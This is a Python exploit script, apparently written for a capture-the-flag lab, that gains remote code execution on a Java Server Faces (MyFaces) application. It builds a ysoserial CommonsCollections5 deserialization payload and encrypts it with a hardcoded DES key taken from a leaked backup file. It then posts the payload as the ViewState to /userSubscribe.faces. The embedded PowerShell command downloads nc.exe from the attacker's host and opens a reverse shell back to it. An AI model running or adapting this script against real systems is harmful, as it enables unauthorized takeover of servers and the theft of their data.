import argparse
import requests
from urllib.parse import urljoin
import traceback
import subprocess
from hashlib import sha1
from base64 import b64decode, b64encode
import pyDes, hmac

"""
**IMPORTANT**
To execute this script, ensure the following prerequisites are met:
    - `ysoserial.jar` is located in the same directory as this Python script.
    - Java 11 is installed to run `ysoserial.jar`.
    - An HTTP server is running on port 80, hosting the `nc.exe` binary for the victim to download.
"""

def generate_payload(lhost, lport):
    """
    Generates the malicious Java serialized object
    """
    print("[*] Generating payload...")
    payload = f'powershell -Command "Invoke-WebRequest -Uri http://{lhost}/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe; Start-Process cmd -ArgumentList \'/c C:\\Windows\\Temp\\nc.exe {lhost} {lport} -e powershell.exe\'"'
    command = [
        "java",
        "-jar",
        "ysoserial.jar",
        "CommonsCollections5",
        payload
    ]

    try:
        result = subprocess.run(command, capture_output=True, text=False)  # get raw bytes
        with open("payload.bin", "wb") as f:
            f.write(result.stdout)
        print("[+] Payload written to payload.bin successfully.")
        return True
    except Exception as e:
        print(f"[-] An error occurred generating the payload: {e}")
        traceback.print_exc()
        return False

def encrypt_payload():
    """
    Encryption/Decryption key was found in web.xml.bak
    org.apache.myfaces.SECRET: SnNGOTg3NiO=
    Algorithm: DES (Default for myfaces)
    Mode: ECB
    Padding: PKCS#5
    """
    payload_file = open('payload.bin', 'rb').read()
    key = b64decode('SnNGOTg3Ni0=')
    obj = pyDes.des(key, pyDes.ECB, padmode=pyDes.PAD_PKCS5)
    enc = obj.encrypt(payload_file)
    hash_val = (hmac.new(key, bytes(enc), sha1).digest())
    payload = enc + hash_val
    print("[+] Payload encrypted successfully.")
    return b64encode(payload)


def send_payload(target):
    """
    send a malicious Java serialized obejct to trigger RCE
    """
    url = urljoin(target, "/userSubscribe.faces")
    data = {
        "javax.faces.ViewState": encrypt_payload()
    }
    print("[*] Sending the payload ...")
    try:
        requests.post(url, data=data)
        print("[+] Payload sent successfully. Check your listener")
    except Exception as e:
        print("[-] Failed to send the payload: ", e)
        traceback.print_exc()

def main():
    parser = argparse.ArgumentParser("Get an RCE via sending malicious Java serialized object")
    parser.add_argument("target", help="Target IP or URL (e.g, http://10.10.16.1)")
    parser.add_argument("lhost", help="Listener IP address")
    parser.add_argument("lport", help="Listener port", type=int)
    args = parser.parse_args()
    
    if generate_payload(args.lhost, args.lport):
        send_payload(args.target)
       


if __name__ == "__main__":
    main()
